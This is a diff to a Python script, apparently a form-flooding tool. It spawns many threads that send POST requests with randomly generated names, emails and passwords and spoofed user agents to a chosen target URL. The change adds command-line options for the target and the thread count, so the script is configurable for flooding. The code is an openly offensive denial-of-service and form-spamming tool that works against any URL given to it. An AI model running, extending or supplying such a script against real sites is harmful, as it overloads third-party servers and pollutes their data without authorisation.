@@ -4,13 +4,11 @@ import random
 import string
 import names
 import subprocess
-
+import argparse
 from fake_useragent import UserAgent
 
-
-
-
-def name_gen():#Generates a random name for the email
+# Generates a random name for the email
+def name_gen():
     name_system = random.choice(["FullName", "FullFirstFirstInitial", "FirstInitialFullLast"])
     first_name = names.get_first_name()
     last_name = names.get_last_name()
@@ -44,8 +42,12 @@ def send_posts(url):
         print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}")
 
 def main():
-    url = input("Enter the URL of the target you want to flood: ")
-    threads = [threading.Thread(target=send_posts, args=(url,), daemon=True) for _ in range(25)]
+    parser = argparse.ArgumentParser(description="Flood a target URL with POST requests.")
+    parser.add_argument('--url', type=str, required=True, help='Target URL to flood')
+    parser.add_argument('--threads', type=int, default=25, help='Number of threads to use')
+    args = parser.parse_args()
+
+    threads = [threading.Thread(target=send_posts, args=(args.url,), daemon=True) for _ in range(args.threads)]
 
     for t in threads:
         t.start()
